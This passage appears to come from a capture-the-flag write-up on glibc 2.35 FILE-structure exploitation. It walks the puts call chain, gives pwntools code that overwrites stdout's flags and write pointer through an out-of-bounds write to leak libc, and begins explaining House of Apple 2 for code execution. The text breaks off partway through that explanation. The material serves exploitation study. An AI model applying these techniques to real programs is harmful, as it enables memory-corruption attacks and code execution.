</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">ssize_t</span> <span class="n">to_do</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">to_do</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">ssize_t</span> <span class="n">count</span> <span class="o">=</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags2</span>
</span></span><span class="line"><span class="cl">                                         <span class="o">&amp;</span> <span class="n">_IO_FLAGS2_NOTCANCEL</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			   <span class="o">?</span> <span class="nf">__write_nocancel</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			   <span class="o">:</span> <span class="nf">__write</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_fileno</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">to_do</span> <span class="o">-=</span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span> <span class="o">+</span> <span class="n">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">-=</span> <span class="n">to_do</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">+=</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, <code>_IO_do_write</code> is an alias to <code>_IO_new_do_write</code>, which eventually will call <code>new_do_write</code>, and finally, it will call <code>_IO_SYSWRITE (fp, data, to_do)</code>. <code>_IO_SYSWRITE</code> will jump to the <code>vtable</code> stored pointer mapped from key <code>__write</code>, which based on the <code>vtable</code> that we saw before in <code>stdout</code>, is equivalent to calling <code>_IO_new_file_write</code>. And finally, this method will call <code>write(f-&gt;fileno, data, to_do)</code></p>
<p>To summarize, below are the possible chain calls that we can trigger when we call <code>puts</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">puts(str)
</span></span><span class="line"><span class="cl">|_ _IO_new_file_xsputn (stdout, str, len)
</span></span><span class="line"><span class="cl">   |_ _IO_new_file_overflow (stdout, EOF)
</span></span><span class="line"><span class="cl">      |_ new_do_write(stdout, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)
</span></span><span class="line"><span class="cl">         |_ _IO_new_file_write(stdout, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)
</span></span><span class="line"><span class="cl">            |_ write(stdout-&gt;fileno, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see from the chain summary, during calling <code>_IO_OVERFLOW</code> inside the <code>puts</code> method, there is a possibility that we can call <code>write(stdout-&gt;fileno, stdout-&gt;_IO_write_base, stdout-&gt;_IO_write_ptr - stdout-&gt;_IO_write_base)</code>.</p>
<p>Back to the <code>gdb</code> result of <code>stdout</code> that we see before, <code>stdout-&gt;fileno</code> is <code>1</code> and both <code>stdout-&gt;_IO_write_base</code> and <code>stdout-&gt;_IO_write_ptr</code> are currently pointing to the same address, and the address is part of the libc region. Taking the <code>stdout-&gt;_IO_write_base</code> address from the previous <code>gdb</code> result (which is <code>0x7ffff7fae803</code>), let&rsquo;s inspect on what is the content of the address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  tele 0x7ffff7fae803
</span></span><span class="line"><span class="cl">0x00007ffff7fae803│+0x0000: 0xfafa70000000000a (&#34;\n&#34;?)
</span></span><span class="line"><span class="cl">0x00007ffff7fae80b│+0x0008: 0xffffff00007ffff7
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">gef➤  tele 0x7ffff7fae803+5
</span></span><span class="line"><span class="cl">0x00007ffff7fae808│+0x0000: 0x00007ffff7fafa70  →  0x0000000000000000
</span></span><span class="line"><span class="cl">0x00007ffff7fae810│+0x0008: 0xffffffffffffffff
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, there is a libc address inside the address pointed by the <code>_IO_write_base</code>, specifically <code>_IO_write_base+5</code>. So, if we&rsquo;re somehow able to overwrite the <code>_IO_write_ptr</code> address of the <code>stdout</code>, so that it won&rsquo;t be pointing to the same address as <code>_IO_write_base</code> (making <code>_IO_write_ptr &gt; _IO_write_base</code>), we will get a libc leak during calling <code>puts</code>, because when <code>puts</code> called <code>_IO_OVERFLOW</code>, it will eventually call <code>write(1, _IO_write_base, _IO_write_ptr - _IO_write_base)</code>, which instructing it to print the content between the range of the <code>_IO_write_ptr</code> and <code>_IO_write_base</code>.</p>
<p>However, notes that there are some constraints that we need to fulfill so that we can successfully execute that chain:</p>
<ul>
<li>During calling <code>_IO_new_file_overflow</code>, notice that we need to bypass these checks before calling the <code>_IO_do_write</code>:
<ul>
<li><code>if (f-&gt;_flags &amp; _IO_NO_WRITES)</code> needs to return False.
<ul>
<li>So, <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L71" target="_blank" rel="noopener noreffer "><code>_IO_NO_WRITES</code></a> is <code>0x0008</code>, which mean <code>stdout-&gt;_flags &amp; 0x0008</code> should be <code>0</code></li>
</ul>
</li>
<li><code>if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)</code> needs to return False.
<ul>
<li><code>_IO_write_base == NULL</code> will always return False because it points to the libc area.</li>
<li><code>(stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</code> needs to return False as well. <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L79" target="_blank" rel="noopener noreffer "><code>_IO_CURRENTLY_PUTTING</code></a> is <code>0x0800</code>, which mean <code>stdout-&gt;_flags &amp; 0x0800</code> should be <code>1</code></li>
</ul>
</li>
<li><code>if (ch == EOF)</code> needs to return True.
<ul>
<li>This will always be satisfied because <code>puts</code> always set the <code>ch</code> to <code>EOF</code>.</li>
</ul>
</li>
</ul>
</li>
<li>Move to the <code>new_do_write</code>, we need to skip the second <code>if</code> condition, so we need to:
<ul>
<li>Make this <code>if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</code> return True.
<ul>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L80" target="_blank" rel="noopener noreffer "><code>_IO_IS_APPENDING</code></a> is <code>0x1000</code>, SO <code>stdout-&gt;_flags &amp; 0x1000</code> should be <code>1</code>.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>So, based on the above constraints, what value that we need to set for the <code>stdout-&gt;_flags</code> is <code>0x1800</code>, so that:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_flags &amp; _IO_NO_WRITES         == 0
</span></span><span class="line"><span class="cl">_flags &amp; _IO_CURRENTLY_PUTTING == 1
</span></span><span class="line"><span class="cl">_flags &amp; _IO_IS_APPENDING      == 1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, with the OOB bug, we can get a libc leak. What should we do are:</p>
<ul>
<li>Overwrite the <code>stdout-&gt;_flags</code> with <code>0x1800</code></li>
<li>Overwrite the last byte of <code>stdout-&gt;_IO_write_ptr</code> to be larger than <code>stdout-&gt;_IO_write_base</code>.</li>
</ul>
<p>By doing this, we will get a libc leak when the binary prints the menu.</p>
<p>Let&rsquo;s start building our exploit by creating some helpers:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">val</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exit_binary</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;=&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And then, allocate a big chunk:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Create a big chunk, so that our chunk is located on the newly page</span>
</span></span><span class="line"><span class="cl"><span class="c1"># created by mmap (To be precise, at libc_base-0xf7ff0)</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_size</span>      <span class="o">=</span> <span class="mi">1000000</span>
</span></span><span class="line"><span class="cl"><span class="n">offset_to_libc</span>  <span class="o">=</span> <span class="mh">0xf7ff0</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">chunk_size</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s start overwriting the <code>_flags</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Leak libc base via stdout
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Prepare the correct offset for stdout and stderr</span>
</span></span><span class="line"><span class="cl"><span class="n">stdout_offset_from_chunk</span> <span class="o">=</span> <span class="n">offset_to_libc</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">stderr_offset_from_chunk</span> <span class="o">=</span> <span class="n">offset_to_libc</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stderr_&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stdout offset: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout_offset_from_chunk</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Stderr offset: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stderr_offset_from_chunk</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite stdout-&gt;_flags to 0x1800</span>
</span></span><span class="line"><span class="cl"><span class="n">flags_offset</span> <span class="o">=</span> <span class="mh">0x0</span>  <span class="c1"># stdout-&gt;_flags = &amp;stdout + 0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1800</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">flags</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">stdout_offset_from_chunk</span><span class="o">+</span><span class="n">flags_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">flags</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have successfully overwritten the <code>stdout</code> flags, let&rsquo;s overwrite the <code>_IO_write_ptr</code>. After we do the edit, we will get a libc leak immediately because the binary will print the menu.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Overwrite stdout-&gt;_IO_write_ptr to be larger than</span>
</span></span><span class="line"><span class="cl"><span class="n">write_ptr_offset</span> <span class="o">=</span> <span class="mh">0x28</span> <span class="c1"># stdout-&gt;_IO_write_ptr = &amp;stdout + 0x28</span>
</span></span><span class="line"><span class="cl"><span class="n">write_ptr_lsb</span>    <span class="o">=</span> <span class="mh">0x50</span> <span class="c1"># You can choose any value. I choose 0x50</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">stdout_offset_from_chunk</span><span class="o">+</span><span class="n">write_ptr_offset</span><span class="p">,</span> <span class="n">write_ptr_lsb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, when the binary called menu() (which will call puts())</span>
</span></span><span class="line"><span class="cl"><span class="c1"># It will leak a libc address, which equivalents to _IO_stdfile_1_lock</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)[</span><span class="mi">5</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked libc  : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_libc</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_stdfile_1_lock&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Libc base    : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0xf7ff0</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Chunk addr   : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">chunk_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/XEbTTC0.png"
        data-srcset="https://i.imgur.com/XEbTTC0.png, https://i.imgur.com/XEbTTC0.png 1.5x, https://i.imgur.com/XEbTTC0.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/XEbTTC0.png"
        title="https://i.imgur.com/XEbTTC0.png" /></p>
<p>Above is the result of our current script. So now, we have successfully retrieved a libc leak. Time to move to the next step, which gaining code execution.</p>
<h3 id="gaining-remote-code-execution-rce">Gaining Remote Code Execution (RCE)</h3>
<p>Up until now, we have:</p>
<ul>
<li>OOB write to libc area.</li>
<li>Libc base address from the leak.</li>
</ul>
<p>We need to leverage the OOB bug and the libc base address leaked info to gain RCE. One thing that comes in mind is using the knowledge that I gathered from the recent discussion about gaining RIP control from FILE structure attack in Glibc 2.35.</p>
<p>To give some context, in the old version of glibc, we can overwrite the <code>file-&gt;vtable</code> address with our fake <code>vtable</code>, so that let&rsquo;s say when a method wants to call <code>_IO_OVERFLOW</code>, instead of jumping to the correct address, it will jump to our desired address that we set in our fake <code>vtable</code>.</p>
<p>However, this has been mitigated because the glibc will check whether the <code>vtable</code> that is stored in the FILE is in the correct region or not. Check the below LOCs:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="nf">IO_validate_vtable</span> <span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* Fast path: The vtable pointer is within the __libc_IO_vtables
</span></span></span><span class="line"><span class="cl"><span class="cm">     section.  */</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uintptr_t</span> <span class="n">section_length</span> <span class="o">=</span> <span class="n">__stop___libc_IO_vtables</span> <span class="o">-</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uintptr_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">uintptr_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">__start___libc_IO_vtables</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">section_length</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* The vtable pointer is not in the expected section.  Use the
</span></span></span><span class="line"><span class="cl"><span class="cm">       slow path, which will terminate the process if necessary.  */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_IO_vtable_check</span> <span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp"># define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_JUMPS_FILE_plus(THIS) \
</span></span></span><span class="line"><span class="cl"><span class="cp">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Taking example let&rsquo;s say a method tries to call <code>_IO_OVERRFLOW</code>, it will try to do the jump to the stored pointer in the <code>vtable</code> value mapped with key <code>__overflow</code>, and before jumping into it, it will validate first whether the stored pointer is in the valid area or not by calling <code>IO_validate_vtable</code>.</p>
<p>So that trick where we set up our fake <code>vtable</code> to jump to a method outside the <code>vtable</code> section area no longer works. However, because the check only validates whether the stored pointer is in <code>vtable</code> region or not, we can still misalign the table (For example, shift the <code>vtable</code> by one entry, so that when a function called <code>_IO_OVERFLOW</code>, it will jump to <code>_IO_UNDERFLOW</code> instead due to the misalignment).</p>
<p>People try to find a way to abuse this check, and recently in this <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/" target="_blank" rel="noopener noreffer ">article</a> by kylebot, he found that the glibc does the check only when jumping with macro <code>_IO_JUMPS_FUNC</code>, but it didn&rsquo;t validate the check when it uses a macro to jump to the <code>wide_vtable</code>, which is <code>_IO_WIDE_JUMPS_FUNC</code>.</p>
<p>Also turns out, there is another article that has been published a few months ago that tried to abuse the same finding from kylebot. The method is called <code>House of Apple 2</code>, which was posted by roderick01 in this <a href="https://bbs.pediy.com/thread-273832.htm" target="_blank" rel="noopener noreffer ">article</a>. I&rsquo;ll try to explain it in more detail based on my understanding during reading these two blogs.</p>
<p>Remember that the mitigation those were implemented in the recent glibc only checks whether the <code>vtable</code> stored in the FILE properties is still in the correct region or not. And the standard <code>vtable</code> that is being used for <code>stdfile</code> is <code>_IO_file_jumps</code>. But in fact, there is a lot of other <code>vtable</code> in the region that we can use, and one of them is <code>_IO_wfile_jumps</code>. Below is the default entry of the <code>_IO_wfile_jumps</code> printed via <code>gdb</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gef➤  print __GI__IO_wfile_jumps
</span></span><span class="line"><span class="cl">$11 = {
</span></span><span class="line"><span class="cl">  __dummy = 0x0,
</span></span><span class="line"><span class="cl">  __dummy2 = 0x0,
</span></span><span class="line"><span class="cl">  __finish = 0x7ffff7e20070 &lt;_IO_new_file_finish&gt;,
</span></span><span class="line"><span class="cl">  __overflow = 0x7ffff7e1a410 &lt;__GI__IO_wfile_overflow&gt;,
